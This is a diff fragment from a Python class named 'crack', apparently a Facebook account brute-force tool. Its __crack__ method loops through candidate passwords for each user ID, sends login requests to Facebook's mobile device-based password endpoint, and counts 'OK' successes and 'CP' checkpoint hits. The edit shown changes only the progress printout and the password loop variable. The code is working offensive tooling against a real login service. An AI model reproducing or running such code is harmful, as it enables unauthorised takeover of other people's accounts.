@@ -435,8 +435,10 @@ class crack:
 					
 	#--- methode
 	def __crack__(self, user, peweh, url_log,pasw):
-		sys.stdout.write(f"\r[ <//> ] {str(self.lo)}/{len(self.id)} OK-:{H}{len(self.ok)}{N} CP-:{K}{len(self.cp)}{N}");sys.stdout.flush()
-        for pw in pasw:
+		global ok,cp,loop 
+		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
+		print (f"\r{komtol} • {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
+		for pw in peweh:
             try:
                 ses=requests.Session()
                 link = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr")
